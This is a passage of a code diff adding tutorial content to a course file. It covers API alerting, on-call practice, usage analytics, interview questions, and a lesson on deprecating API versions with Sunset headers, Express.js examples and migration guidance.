+                            <h3>Alert Thresholds</h3>
+
+                            <div class="code-block">Set meaningful thresholds
+
+❌ BAD: Alert on everything
+- Any 5xx error → alert
+→ Result: 100 alerts/day, ignored (alert fatigue)
+
+✅ GOOD: Alert on significant issues
+- 5xx rate > 0.1% for 5 minutes → Page on-call
+- 5xx rate > 1% for 1 minute → Critical page
+- p95 latency > 1s for 10 minutes → Warning
+- Throughput drops 50% → Critical
+
+Severity levels:
+1. Critical: Page immediately (service down, high error rate)
+2. Warning: Email/Slack (elevated errors, slow response)
+3. Info: Log only (minor issues)
+
+Alert rules:
+// Prometheus AlertManager
+groups:
+  - name: api_alerts
+    rules:
+      - alert: HighErrorRate
+        expr: rate(http_requests_total{status_code=~"5.."}[5m]) > 0.001
+        for: 5m
+        labels:
+          severity: critical
+        annotations:
+          summary: "High 5xx error rate"
+          description: "Error rate is {{ $value }} (threshold: 0.1%)"
+
+      - alert: HighLatency
+        expr: histogram_quantile(0.95, http_request_duration_seconds) > 1
+        for: 10m
+        labels:
+          severity: warning
+        annotations:
+          summary: "High p95 latency"</div>
+
+                            <h3>Alert Fatigue Prevention</h3>
+
+                            <div class="code-block">Avoid too many alerts
+
+Problems with over-alerting:
+- Engineers ignore alerts (cry wolf)
+- Important alerts missed
+- Burnout from constant pages
+
+Solutions:
+1. Meaningful thresholds (not 1 error = alert)
+2. Time windows (5 minutes, not instant)
+3. Alert on rate of change (50% increase)
+4. Deduplicate (group similar alerts)
+5. Auto-resolve (alert clears when issue fixed)
+6. Different severity (not everything is critical)
+
+Example progression:
+1 error → Log (info)
+10 errors in 5 min → Slack notification (warning)
+100 errors in 5 min → Page on-call (critical)
+
+Alert design:
+- Actionable: Can engineer fix it?
+- Contextualized: Enough info to debug
+- Tuned: Not too sensitive, not too late
+
+Bad alert: "Error occurred"
+Good alert: "Payment API 5xx rate 2.5% (threshold 0.1%), affecting 50 users, started 5 min ago. Runbook: https://wiki.example.com/payment-errors"</div>
+
+                            <h3>On-Call Rotations</h3>
+
+                            <div class="code-block">Incident response process
+
+On-call setup:
+- Primary on-call: Responds to pages
+- Secondary on-call: Backup if primary unavailable
+- Escalation policy: Auto-escalate if no ack in 5 min
+- Rotation: Weekly or bi-weekly
+
+Tools: PagerDuty, Opsgenie, VictorOps
+
+Incident response:
+1. Acknowledge alert (stop escalation)
+2. Assess severity (P0 critical, P1 high, P2 medium)
+3. Mitigate (restore service if down)
+4. Investigate root cause
+5. Fix permanently
+6. Post-mortem (learn from incident)
+
+Runbooks:
+- Document common issues and fixes
+- "High error rate" → Check DB connections, restart service
+- "High latency" → Check external APIs, scale up servers
+- Link from alerts to runbooks
+
+Blameless post-mortems:
+- What happened?
+- Timeline of events
+- Root cause
+- How detected?
+- How fixed?
+- How to prevent? (action items)</div>
+
+                            <h2>API Analytics</h2>
+
+                            <h3>Usage Patterns</h3>
+
+                            <div class="code-block">Understand how APIs are used
+
+Track:
+- Requests by hour/day/week
+- Peak usage times
+- Growth trends
+- Seasonal patterns
+
+Example insights:
+- Peak: 12pm-1pm (lunch hour)
+- Weekday: 3x more traffic than weekend
+- Growth: 10% month-over-month
+- Pattern: Spike every Monday 9am (reports generated)
+
+Use for:
+- Capacity planning (scale before peak)
+- Cost optimization (scale down off-peak)
+- Feature planning (invest in popular features)</div>
+
+                            <h3>Popular Endpoints</h3>
+
+                            <div class="code-block">Which endpoints are used most?
+
+Top endpoints by request count:
+1. GET /api/users - 45% of traffic
+2. POST /api/orders - 20%
+3. GET /api/products - 15%
+4. GET /api/search - 10%
+5. Other - 10%
+
+Insights:
+- Optimize popular endpoints first
+- Cache GET /api/users (45% of traffic!)
+- Monitor critical endpoints (orders, payments)
+- Consider deprecating unused endpoints
+
+Slowest endpoints (p95 latency):
+1. GET /api/reports - 3.5s
+2. POST /api/batch - 2.1s
+3. GET /api/search - 850ms
+
+Insights:
+- Optimize slow endpoints
+- Consider async processing for reports
+- Add rate limiting to expensive endpoints</div>
+
+                            <h3>Client Analytics</h3>
+
+                            <div class="code-block">Track API usage by client
+
+Identify clients:
+- API key (which customer?)
+- User-Agent (mobile app? web? version?)
+- IP address (geolocation)
+
+Metrics per client:
+- Request volume
+- Error rate
+- Response time
+- Features used
+
+Example:
+Client A (mobile v1.2.3):
+- 10,000 requests/day
+- 2% error rate (validation errors)
+- p95: 200ms
+
+Client B (web app):
+- 50,000 requests/day
+- 0.1% error rate
+- p95: 150ms
+
+Client C (Partner integration):
+- 5,000 requests/day
+- 5% error rate (using deprecated endpoint)
+- p95: 500ms
+
+Actions:
+- Contact Client C about errors
+- Optimize for Client B (highest volume)
+- Update mobile app (Client A) if needed</div>
+
+                            <h3>API Health Dashboards</h3>
+
+                            <div class="code-block">Single pane of glass for API health
+
+Dashboard sections:
+
+1. Overall Health
+- Uptime: 99.95%
+- Error rate: 0.05%
+- p95 latency: 230ms
+- Throughput: 450 RPS
+
+2. Traffic
+- RPS over time (line chart)
+- Requests by endpoint (pie chart)
+- Requests by status code (bar chart)
+
+3. Performance
+- p50, p95, p99 latency (line chart)
+- Slow endpoints (table)
+- Response time heatmap
+
+4. Errors
+- Error rate over time (line chart)
+- Errors by type (bar chart)
+- Recent errors (list with stack traces)
+
+5. Infrastructure
+- CPU usage
+- Memory usage
+- Database connections
+- Cache hit rate
+
+6. Business Metrics
+- API calls by customer
+- Revenue by API usage
+- Popular features
+
+Tools: Grafana, DataDog, New Relic dashboards</div>
+
+                            <h2>Summary</h2>
+
+                            <ul>
+                                <li><strong>Key metrics:</strong> Response time (p50, p95, p99), error rate (4xx vs 5xx), throughput (RPS), availability (uptime %)</li>
+                                <li><strong>Percentiles matter:</strong> Track p95/p99, not just average - shows tail latency and worst user experience</li>
+                                <li><strong>APM tools:</strong> New Relic, DataDog provide request tracing, performance breakdown, error tracking</li>
+                                <li><strong>Log aggregation:</strong> ELK stack (Elasticsearch, Logstash, Kibana) or Splunk for centralized searchable logs</li>
+                                <li><strong>Metrics:</strong> Prometheus (collect) + Grafana (visualize) for time-series metrics and dashboards</li>
+                                <li><strong>Distributed tracing:</strong> Jaeger/Zipkin trace requests across microservices, find bottlenecks</li>
+                                <li><strong>Error tracking:</strong> Sentry/Rollbar captures errors with stack traces, groups similar errors, tracks affected users</li>
+                                <li><strong>Alerting:</strong> Set meaningful thresholds (not too sensitive), use severity levels, prevent alert fatigue</li>
+                                <li><strong>On-call:</strong> Incident response process, runbooks, blameless post-mortems</li>
+                                <li><strong>Analytics:</strong> Track usage patterns, popular endpoints, client analytics, create health dashboards</li>
+                                <li><strong>SLA examples:</strong> 99.9% = 8.76 hrs downtime/year, 99.99% = 52 minutes/year</li>
+                                <li><strong>Alert fatigue:</strong> Avoid over-alerting, use time windows, deduplicate, auto-resolve, make alerts actionable</li>
                             </ul>
                         `,
-                        interviews: []
+                        interviews: [
+                            {
+                                question: "Why should you track percentiles (p50, p95, p99) instead of average response time?",
+                                answer: "Averages hide outliers and don't represent actual user experience. Example: 9 requests at 100ms + 1 request at 10s = average 1.09s, but actually 90% of requests were fast. Percentiles: p50 (median) = 50% faster than this, p95 = 95% faster, p99 = 99% faster. p95 represents experience for most users, p99 shows worst experience (tail latency). Real scenario: p50=150ms, p95=450ms, p99=2s means most users see <450ms, but 1% wait 2+ seconds (investigate!). SLAs use percentiles: '95% of requests < 500ms' = p95 < 500ms. Averages can look good while users suffer: average 200ms but p99 10s = some users have terrible experience. For APIs: Track p50 (typical), p95 (SLA target), p99 (worst case). Alert on p95 > threshold, not average. Tools: Prometheus histogram_quantile(0.95, ...), DataDog p95 metric. Why p99 matters: Even if rare, affects real users - 1% of 1M requests = 10K slow requests."
+                            },
+                            {
+                                question: "What is the difference between 4xx and 5xx errors and how should you monitor them?",
+                                answer: "4xx = client errors (user mistakes): 400 Bad Request (invalid input), 401 Unauthorized (no/invalid token), 403 Forbidden (insufficient permissions), 404 Not Found (resource doesn't exist), 429 Too Many Requests (rate limited). Client's fault. 5xx = server errors (your problems): 500 Internal Server Error (unhandled exception), 502 Bad Gateway (upstream service error), 503 Service Unavailable (service down), 504 Gateway Timeout (slow upstream). Your fault. Monitoring: Track separately because different implications. 4xx rate: Usually 1-5% (normal user mistakes, validation errors) - monitor trends but don't page. 5xx rate: Should be <0.1% (your bugs/outages) - page on-call if >0.1%. Alert: 4xx spike might indicate: API docs unclear, breaking change, client bug. 5xx spike means: Your service has issues, database down, external service failing. Metrics: error_rate_4xx, error_rate_5xx, error_rate_total. Don't conflate: High 4xx is user issue, high 5xx is your issue requiring immediate attention. Example: 5% 4xx (acceptable), 2% 5xx (CRITICAL - page immediately)."
+                            },
+                            {
+                                question: "How do you prevent alert fatigue in API monitoring?",
+                                answer: "Alert fatigue = too many alerts → engineers ignore them → miss critical issues. Prevention: 1) Meaningful thresholds: Don't alert on single error, alert on rate: 5xx rate >0.1% for 5 minutes, not 1 error instantly. 2) Time windows: Require sustained issue, not transient spike. 3) Rate of change: Alert on 50% increase, not absolute. 4) Deduplicate: Group similar alerts (100 database errors = 1 alert, not 100). 5) Auto-resolve: Alert clears when metric returns to normal. 6) Severity levels: Critical (page), Warning (Slack), Info (log only) - not everything is critical. 7) Actionable alerts: Include runbook link, enough context to debug. Bad alert: 'Error occurred' every minute. Good alert: '5xx rate 2.5% (threshold 0.1%), 50 users affected, started 5min ago. Runbook: https://...'. Example progression: 1 error → log, 10 errors/5min → Slack, 100 errors/5min → page. Review alerts quarterly: Which alerts ignored? Remove or adjust. Goal: Every alert requires action. If engineers ignore alerts, thresholds too sensitive. Balance: Don't alert too early (noise) or too late (outage)."
+                            },
+                            {
+                                question: "What tools and strategies would you use for API observability in a microservices architecture?",
+                                answer: "Observability = logs + metrics + traces. For microservices: 1) Distributed tracing: Jaeger/Zipkin to trace requests across services, correlate with trace IDs, find bottlenecks (which service slow?). 2) Centralized logging: ELK stack or Splunk, aggregate logs from all services, structured JSON logs, correlate by request_id/trace_id. 3) Metrics: Prometheus + Grafana, scrape metrics from each service (/metrics endpoint), dashboards per service and overall. 4) APM: DataDog/New Relic for full-stack visibility, auto-instrumentation. 5) Error tracking: Sentry to capture exceptions across services, group by service. 6) Service mesh: Istio/Linkerd for network observability (traffic, latency between services). Strategy: 1) Standardize: All services use same logging format, instrumentation. 2) Request IDs: Propagate across services for correlation. 3) SLOs per service: Define service-level objectives (99.9% uptime, p95 <500ms). 4) Dashboards: Overall health + per-service dashboards. 5) Alerts: Service-level alerts + cross-service alerts (e.g., order flow involving 4 services). Example stack: OpenTelemetry (instrumentation) → Jaeger (traces) + Prometheus (metrics) + Elasticsearch (logs) → Grafana (visualization). Key: Correlation - link traces, logs, metrics by request_id."
+                            },
+                            {
+                                question: "How do you set appropriate SLAs (Service Level Agreements) for APIs?",
+                                answer: "SLA defines expected service quality - uptime, latency, error rate. Setting SLAs: 1) Measure current performance: Baseline p95 latency, uptime, error rate over 3-6 months. 2) Business requirements: What do users need? E-commerce checkout needs higher uptime than reporting. 3) Cost tradeoff: 99.99% uptime costs more than 99.9% (redundancy, on-call). 4) Set realistic targets: Don't promise 99.99% if only achieving 99.5% currently. Common tiers: 99% = 3.65 days downtime/year (consumer apps), 99.9% = 8.76 hrs/year (business apps), 99.95% = 4.38 hrs/year, 99.99% = 52 mins/year (financial, healthcare), 99.999% = 5 mins/year (critical infrastructure). SLA components: 1) Availability: 99.9% uptime, 2) Latency: 95% requests <500ms, 99% <1s, 3) Error rate: <0.1% 5xx errors, 4) Throughput: Support 1000 RPS. Examples: Stripe API: 99.99% uptime, AWS: 99.95% uptime per region. Measure: Error budget = (1 - SLA) * time. 99.9% SLA = 0.1% error budget = 43 mins/month downtime allowed. Consequences: SLA breaches may trigger credits/refunds. Start conservative (99.9%), improve as infrastructure matures. Don't overcommit - missing SLA loses customer trust."
+                            },
+                            {
+                                question: "What analytics should you track to understand API usage and improve the product?",
+                                answer: "API analytics for product decisions: 1) Endpoint popularity: Which endpoints get most traffic? Optimize popular ones, deprecate unused. Example: GET /users = 45% traffic → prioritize optimization, /legacy endpoint = 0.01% → candidate for deprecation. 2) Usage patterns: Peak hours (12pm-1pm), weekday vs weekend, seasonal trends, growth rate (10% MoM). Use for capacity planning and scaling. 3) Feature adoption: Track new endpoint usage after launch, A/B test API changes, measure before/after metrics. 4) Client analytics: By API key/customer - who uses API most? Which clients have high error rates? Revenue per client (if API monetized). 5) Error analysis: Common error codes (lots of 400s = unclear docs/validation), error rate by endpoint, error messages (which validations fail most?). 6) Performance by client: Which clients experience slow responses? Mobile vs web performance differences. 7) Latency breakdown: Time in API vs database vs external services, identify bottlenecks. 8) Conversion funnels: For workflows like signup or checkout, track drop-off points. Product decisions from analytics: High /search usage → invest in search relevance, Slow /reports → move to async, 10% 400 errors on /checkout → improve validation messages, Mobile users slower → optimize for mobile. Tools: Custom dashboards (Grafana), business intelligence (Looker, Tableau), product analytics (Amplitude, Mixpanel) if user-facing API."
+                            }
+                        ]
                     },
                     {
                         id: 'versioning-deprecation',
-                        title: 'API Versioning & Deprecation',
+                        title: 'API Deprecation Process',
                         duration: '40 min',
                         content: `
-                            <h2>OUTLINE: Deprecation Process</h2>
+                            <h2>Deprecation Strategy</h2>
 
-                            <h3>Topics to Cover:</h3>
-                            <ul style="margin: 1rem 0; margin-left: 2rem;">
-                                <li><strong>Deprecation Strategy</strong>
-                                    - Announcement timeline (6-12 months notice)
-                                    - Communication channels
-                                    - Migration guides
-                                    - Parallel run period
-                                </li>
-                                <li><strong>Deprecation Headers</strong>
-                                    - Deprecated: true
-                                    - Sunset: [date]
-                                    - Link: rel="successor-version"
-                                    - Warning headers
-                                </li>
-                                <li><strong>Breaking Change Management</strong>
-                                    - What requires new version
-                                    - Backward compatibility techniques
-                                    - Feature flags
-                                    - Gradual rollout
-                                </li>
-                                <li><strong>End-of-Life Process</strong>
-                                    - Final shutdown checklist
-                                    - Redirect strategies
-                                    - User communication
-                                    - Analytics on old version usage
-                                </li>
-                            </ul>
+                            <p>Deprecating APIs is inevitable as your product evolves. The key is doing it gracefully without breaking existing integrations.</p>
 
-                            <h3>Examples to Include:</h3>
-                            <ul style="margin: 1rem 0; margin-left: 2rem;">
-                                <li>Twitter API v1.1 sunset</li>
-                                <li>Google+ API shutdown</li>
-                                <li>Deprecation email templates</li>
+                            <h3>Announcement Timeline</h3>
+
+                            <div class="code-block">Typical deprecation timeline: 6-12 months
+
+Timeline example:
+
+Month 0: Announce deprecation
+- Blog post announcement
+- Email to all API users
+- In-app notifications
+- Update documentation
+
+Month 1-3: Migration period
+- Provide migration guide
+- Offer support/consulting
+- Monitor adoption of new version
+
+Month 4-6: Warning period
+- Add deprecation headers to responses
+- Email reminders to users still on old version
+- Track usage metrics
+
+Month 9: Escalation
+- Final warning emails
+- Personal outreach to heavy users
+- Consider extending timeline if needed
+
+Month 12: Shutdown
+- Disable old version
+- Return 410 Gone
+- Redirect to migration guide
+
+Short timeline (3-6 months): Minor changes, low usage
+Long timeline (12-18 months): Major version, high usage, enterprise clients
+
+Never: Immediate shutdown without notice (breaks trust)</div>
+
+                            <h3>Communication Channels</h3>
+
+                            <div class="code-block">Multi-channel approach
+
+1. Developer Blog
+POST: "Deprecating API v1 - Migrate to v2 by Dec 31"
+- What's changing
+- Why (benefits of v2)
+- Migration guide
+- Timeline
+- Support resources
+
+2. Email Campaigns
+To: All users with v1 API keys
+Subject: [Action Required] API v1 Deprecation - 6 Months Notice
+
+Hi Developer,
+
+We're deprecating API v1 on December 31, 2024. Please migrate to v2.
+
+What's changing:
+- Endpoint: /api/v1/users → /api/v2/users
+- Response format: wrapped → flat
+- Authentication: API key → Bearer token
+
+Migration guide: https://docs.example.com/migrate-v1-to-v2
+Support: api-support@example.com
+
+Timeline:
+- June 1: Announcement (today)
+- Dec 1: Final warning
+- Dec 31: v1 shutdown
+
+3. In-API Notifications
+Response headers:
+Deprecation: true
+Sunset: Mon, 31 Dec 2024 23:59:59 GMT
+Link: <https://docs.example.com/migrate>; rel="deprecation"
+
+4. Dashboard Banner
+"API v1 will be deprecated on Dec 31. Migrate to v2"
+[Migration Guide] [Dismiss]
+
+5. Status Page
+https://status.example.com
+"API v1 Deprecation: Dec 31, 2024"
+
+6. Social Media
+Twitter, LinkedIn announcements
+Reach broader developer community</div>
+
+                            <h3>Migration Guides</h3>
+
+                            <div class="code-block">Comprehensive migration documentation
+
+# Migrating from API v1 to v2
+
+## TL;DR
+- Update base URL: api.example.com/v1 → api.example.com/v2
+- Change auth: X-API-Key header → Authorization: Bearer token
+- Response format: { data: {...} } → {...}
+
+## Breaking Changes
+
+### 1. Authentication
+v1: API Key in header
+GET /api/v1/users
+X-API-Key: abc123
+
+v2: Bearer token
+GET /api/v2/users
+Authorization: Bearer eyJhbGc...
+
+Migration:
+1. Generate v2 token: https://dashboard.example.com/tokens
+2. Replace X-API-Key with Authorization header
+
+### 2. Response Format
+v1: Wrapped
+{
+  "data": { "id": 1, "name": "Alice" },
+  "meta": { "timestamp": "..." }
+}
+
+v2: Flat
+{
+  "id": 1,
+  "name": "Alice"
+}
+
+Migration:
+Change: response.data.id → response.id
+
+### 3. Date Format
+v1: Unix timestamp
+{ "created_at": 1617123456 }
+
+v2: ISO 8601
+{ "created_at": "2024-01-15T10:30:00Z" }
+
+Migration:
+Parse dates: new Date(response.created_at)
+
+## Code Examples
+
+v1:
+const response = await fetch('https://api.example.com/v1/users', {
+  headers: { 'X-API-Key': 'abc123' }
+});
+const userId = response.data.id;
+
+v2:
+const response = await fetch('https://api.example.com/v2/users', {
+  headers: { 'Authorization': 'Bearer token123' }
+});
+const userId = response.id;
+
+## Testing
+1. Test v2 in staging: https://staging.api.example.com/v2
+2. Run parallel: Send traffic to both v1 and v2
+3. Validate: Compare responses
+4. Switch: Update production to v2
+
+## Support
+- Migration support: api-support@example.com
+- Office hours: Tuesdays 2-4pm PT
+- Migration tool: https://migrate.example.com</div>
+
+                            <h3>Parallel Run Period</h3>
+
+                            <div class="code-block">Run old and new versions simultaneously
+
+Benefits:
+✅ No immediate breaking changes
+✅ Gradual migration
+✅ Easy rollback if issues
+
+// Support both v1 and v2
+app.use('/api/v1', v1Router);
+app.use('/api/v2', v2Router);
+
+// Or: Version in header
+app.use('/api/users', (req, res) => {
+  const version = req.headers['api-version'] || 'v1';
+
+  if (version === 'v1') {
+    return v1UsersHandler(req, res);
+  } else if (version === 'v2') {
+    return v2UsersHandler(req, res);
+  } else {
+    return res.status(400).json({ error: 'Unsupported API version' });
+  }
+});
+
+Track usage:
+// Log v1 vs v2 usage
+logger.info({
+  version: req.path.includes('/v1') ? 'v1' : 'v2',
+  endpoint: req.path,
+  user: req.user?.id
+});
+
+Dashboard:
+- v1 usage: 40% (decreasing)
+- v2 usage: 60% (increasing)
+→ Safe to deprecate v1 when usage < 1%</div>
+
+                            <h2>Deprecation Headers</h2>
+
+                            <h3>Sunset Header (RFC 8594)</h3>
+
+                            <div class="code-block">Standard header to announce deprecation
+
+Sunset: Sat, 31 Dec 2024 23:59:59 GMT
+
+Implementation:
+app.use('/api/v1/*', (req, res, next) => {
+  // Add sunset header
+  res.setHeader('Sunset', 'Sat, 31 Dec 2024 23:59:59 GMT');
+
+  // Optional: Deprecation header
+  res.setHeader('Deprecation', 'true');
+
+  // Link to migration guide
+  res.setHeader('Link', '<https://docs.example.com/migrate>; rel="deprecation"');
+
+  next();
+});
+
+Response:
+HTTP/1.1 200 OK
+Sunset: Sat, 31 Dec 2024 23:59:59 GMT
+Deprecation: true
+Link: <https://docs.example.com/migrate>; rel="deprecation"
+
+Clients can check:
+const sunset = response.headers.get('Sunset');
+if (sunset && new Date(sunset) < new Date(Date.now() + 90*24*60*60*1000)) {
+  console.warn('API will be deprecated in < 90 days!', sunset);
+}</div>
+
+                            <h3>Warning Header</h3>
+
+                            <div class="code-block">Provide actionable warnings
+
+Warning: 299 - "API v1 is deprecated. Migrate to v2 by Dec 31, 2024. See https://docs.example.com/migrate"
+
+Implementation:
+res.setHeader('Warning', '299 - "API v1 deprecated. Migrate by Dec 31. https://migrate.example.com"');
+
+Standard warning codes:
+- 110: Response is Stale
+- 199: Miscellaneous warning
+- 299: Miscellaneous persistent warning (best for deprecation)
+
+Client handling:
+const warning = response.headers.get('Warning');
+if (warning) {
+  console.error('API Warning:', warning);
+  // Log to monitoring, alert developers
+}</div>
+
+                            <h2>Breaking Change Management</h2>
+
+                            <h3>What Requires a New Version?</h3>
+
+                            <div class="code-block">Breaking vs non-breaking changes
+
+✅ NON-BREAKING (can add without new version):
+- Add new endpoints
+- Add new optional fields to requests
+- Add new fields to responses
+- Add new error codes
+- Make required field optional
+- Increase rate limits
+
+❌ BREAKING (requires new version):
+- Remove endpoints
+- Remove fields from responses
+- Change field types (string → number)
+- Make optional field required
+- Rename fields
+- Change authentication method
+- Change URL structure
+- Decrease rate limits
+- Change error code meanings
+
+Example - NON-BREAKING:
+v1: { "id": 1, "name": "Alice" }
+v2: { "id": 1, "name": "Alice", "email": "alice@example.com" }
+→ Added field, old clients ignore it ✅
+
+Example - BREAKING:
+v1: { "id": 1, "name": "Alice", "created": 1617123456 }
+v2: { "id": 1, "name": "Alice", "createdAt": "2024-01-15..." }
+→ Renamed field, old clients break ❌</div>
+
+                            <h3>Backward Compatibility Techniques</h3>
+
+                            <div class="code-block">Avoid breaking changes with compatibility layers
+
+1. Support old field names
+// v2 includes both old and new names
+{
+  "id": 1,
+  "name": "Alice",
+  "created": "2024-01-15T10:30:00Z",      // Deprecated
+  "createdAt": "2024-01-15T10:30:00Z",    // New
+  "created_at": "2024-01-15T10:30:00Z"    // Alternative
+}
+
+2. Field aliasing in server
+function serializeUser(user) {
+  return {
+    id: user.id,
+    name: user.name,
+    createdAt: user.createdAt,
+    created: user.createdAt,  // Alias for backward compat
+    created_at: user.createdAt  // Snake_case alias
+  };
+}
+
+3. Accept old formats
+// Accept both old and new auth
+if (req.headers['x-api-key']) {
+  // Old: API key auth
+  user = await authenticateApiKey(req.headers['x-api-key']);
+} else if (req.headers['authorization']) {
+  // New: Bearer token
+  user = await authenticateToken(req.headers['authorization']);
+}
+
+4. Transform layer
+// Transform old request format to new
+function transformV1toV2(v1Request) {
+  return {
+    userId: v1Request.user_id,  // Snake to camel
+    createdAt: new Date(v1Request.created * 1000).toISOString()  // Unix to ISO
+  };
+}
+
+Tradeoff: Maintains compatibility but adds complexity
+Use temporarily during migration, remove after v1 sunset</div>
+
+                            <h3>Feature Flags</h3>
+
+                            <div class="code-block">Gradual rollout of breaking changes
+
+// Feature flag system
+const features = {
+  useV2ResponseFormat: false
+};
+
+app.get('/api/users/:id', async (req, res) => {
+  const user = await db.users.findOne({ id: req.params.id });
+
+  if (features.useV2ResponseFormat || req.query.beta === 'true') {
+    // v2 format (flat)
+    return res.json(user);
+  } else {
+    // v1 format (wrapped)
+    return res.json({ data: user });
+  }
+});
+
+Rollout plan:
+1. Week 1: Beta testers (beta=true query param)
+2. Week 2: 10% of traffic (random)
+3. Week 3: 50% of traffic
+4. Week 4: 100% of traffic
+5. Week 5: Remove flag, v2 only
+
+Benefits:
+✅ Test in production with real traffic
+✅ Easy rollback (flip flag)
+✅ Gradual migration
+✅ Monitor for issues
+
+Tools: LaunchDarkly, Unleash, custom feature flags</div>
+
+                            <h2>End-of-Life Process</h2>
+
+                            <h3>Final Shutdown Checklist</h3>
+
+                            <div class="code-block">Steps for clean shutdown
+
+1 month before:
+□ Send final warning email
+□ Add countdown banner to dashboard
+□ Check analytics: Who's still using v1?
+□ Personal outreach to top 10 users
+
+1 week before:
+□ Send final reminder
+□ Double-check v2 is stable
+□ Prepare redirect/error responses
+□ Update documentation
+
+Shutdown day:
+□ Disable v1 endpoints
+□ Return 410 Gone with migration link
+□ Monitor support channels
+□ Update status page
+
+After shutdown:
+□ Remove v1 code (after grace period)
+□ Archive v1 documentation
+□ Post-mortem: What went well? What didn't?
+
+// Shutdown implementation
+app.use('/api/v1/*', (req, res) => {
+  res.status(410).json({
+    error: {
+      code: 'API_VERSION_DEPRECATED',
+      message: 'API v1 was deprecated on Dec 31, 2024. Please migrate to v2.',
+      migration_guide: 'https://docs.example.com/migrate',
+      support: 'api-support@example.com'
+    }
+  });
+});
+
+410 Gone (not 404):
+- 410: Permanently removed, won't come back
+- 404: Might exist at different URL
+→ 410 signals "stop trying, migrate"</div>
+
+                            <h3>Redirect Strategies</h3>
+
+                            <div class="code-block">Options for handling old requests
+
+Option 1: Hard shutdown (410 Gone)
+app.use('/api/v1/*', (req, res) => {
+  res.status(410).json({ error: 'Deprecated. Use v2.' });
+});
+
+Option 2: Redirect to v2
+app.use('/api/v1/*', (req, res) => {
+  const v2Path = req.path.replace('/v1/', '/v2/');
+  res.redirect(308, v2Path);  // 308 = Permanent redirect
+});
+
+Caveat: Only if v2 API compatible!
+
+Option 3: Proxy to v2 with transformation
+app.use('/api/v1/*', async (req, res) => {
+  const v2Path = req.path.replace('/v1/', '/v2/');
+
+  // Call v2 API
+  const v2Response = await fetch(\`http://localhost:3000\${v2Path}\`);
+  const v2Data = await v2Response.json();
+
+  // Transform v2 response to v1 format
+  const v1Data = { data: v2Data };  // Wrap for v1
+
+  res.json(v1Data);
+});
+
+Use case: Extremely gradual sunset
+
+Best practice: Hard shutdown (410) after grace period
+Redirects/proxies delay inevitable migration</div>
+
+                            <h3>Analytics on Old Version Usage</h3>
+
+                            <div class="code-block">Track who's still using deprecated version
+
+Metrics to track:
+- v1 requests per day (trend)
+- v1 users (API keys)
+- v1 endpoints called
+- Top v1 users by volume
+
+// Track v1 usage
+app.use('/api/v1/*', (req, res, next) => {
+  analytics.track('deprecated_api_usage', {
+    version: 'v1',
+    endpoint: req.path,
+    user: req.user?.id,
+    api_key: req.headers['x-api-key']?.substring(0, 8)  // Partial key
+  });
+
+  next();
+});
+
+Dashboard:
+┌─────────────┬───────────────┬─────────┐
+│ API Key     │ Daily Requests│ Last Use│
+├─────────────┼───────────────┼─────────┤
+│ sk_prod_abc │ 10,000        │ Today   │ ← Heavy user, contact!
+│ sk_prod_def │ 500           │ Today   │
+│ sk_test_xyz │ 50            │ 2 days  │ ← Test key, ignore
+│ sk_prod_ghi │ 10            │ 30 days │ ← Inactive
+└─────────────┴───────────────┴─────────┘
+
+Action:
+- >1000 req/day: Personal email/call
+- >100 req/day: Targeted email
+- <100 req/day: Standard reminder
+
+Check before shutdown:
+if (v1DailyRequests < 100) {
+  // Safe to shut down
+} else {
+  // Extend timeline or offer migration help
+}</div>
+
+                            <h2>Real-World Examples</h2>
+
+                            <h3>Twitter API v1.1 Sunset</h3>
+
+                            <div class="code-block">Twitter's API deprecation (2013)
+
+Timeline:
+- March 2013: Announced v1.1, deprecated v1
+- June 2013: v1 retired (3 months notice)
+
+Criticism: Too short notice, broke many apps
+
+Lesson: Give longer notice for widely-used APIs
+
+v1 → v1.1 changes:
+- Authentication: All endpoints require OAuth (was optional)
+- Rate limits: Per-user instead of per-IP
+- Response format: Changed JSON structure
+
+Impact: Many third-party Twitter clients broke
+Outcome: Developer backlash, some never migrated</div>
+
+                            <h3>Google+ API Shutdown</h3>
+
+                            <div class="code-block">Google+ API shutdown (2019)
+
+Timeline:
+- Oct 2018: Announced shutdown
+- March 2019: Shutdown (6 months notice)
+
+Communication:
+- Blog post
+- Email to all API users
+- In-console notifications
+- Migration to alternative APIs
+
+Lesson: Clear migration path to alternatives
+
+Alternative offered:
+- Social features → Google Sign-In
+- Profile data → People API
+
+Shutdown execution:
+- March 7, 2019: All APIs return 410 Gone
+- Redirect to shutdown notice page
+- No grace period extensions
+
+Clean, professional shutdown</div>
+
+                            <h3>Deprecation Email Template</h3>
+
+                            <div class="code-block">Example deprecation email
+
+Subject: [Action Required] API v1 Deprecation - Migrate by Dec 31
+
+Hi [Developer Name],
+
+We're writing to inform you that API v1 will be deprecated on December 31, 2024.
+
+WHAT'S CHANGING
+API v1 endpoints will no longer be available. Please migrate to v2.
+
+WHY WE'RE DOING THIS
+- Improved performance (2x faster)
+- Better security (OAuth 2.0)
+- New features (webhooks, batch operations)
+- Simplified response format
+
+TIMELINE
+- Today (June 1): Announcement
+- September 1: Deprecation warnings in responses
+- December 1: Final reminder
+- December 31: v1 shutdown
+
+HOW TO MIGRATE
+1. Review migration guide: https://docs.example.com/migrate
+2. Update your code (see examples below)
+3. Test in staging: https://staging-api.example.com/v2
+4. Deploy to production
+
+QUICK EXAMPLE
+Old (v1):
+  GET https://api.example.com/v1/users
+  X-API-Key: abc123
+
+New (v2):
+  GET https://api.example.com/v2/users
+  Authorization: Bearer eyJhbGc...
+
+NEED HELP?
+- Migration guide: https://docs.example.com/migrate
+- Support: api-support@example.com
+- Office hours: Tuesdays 2-4pm PT
+- Migration tool: https://migrate.example.com (auto-convert code)
+
+YOUR USAGE
+- Current v1 requests: 5,000/day
+- Endpoints used: GET /users, POST /orders
+
+Thank you for being a valued API user. We're here to help with your migration.
+
+Best regards,
+The API Team
+
+[Migrate Now] [View Guide] [Contact Support]</div>
+
+                            <h2>Summary</h2>
+
+                            <ul>
+                                <li><strong>Timeline:</strong> 6-12 months notice for major deprecations, more for enterprise APIs</li>
+                                <li><strong>Communication:</strong> Multi-channel (blog, email, headers, dashboard, status page, social media)</li>
+                                <li><strong>Migration guide:</strong> Comprehensive docs with breaking changes, code examples, testing steps</li>
+                                <li><strong>Parallel run:</strong> Support old and new versions simultaneously during migration period</li>
+                                <li><strong>Sunset header:</strong> Standard RFC 8594 header to announce deprecation date</li>
+                                <li><strong>Warning header:</strong> 299 code with actionable migration message</li>
+                                <li><strong>Breaking changes:</strong> Removing fields, changing types, renaming fields require new version</li>
+                                <li><strong>Backward compatibility:</strong> Field aliasing, accept old formats temporarily during migration</li>
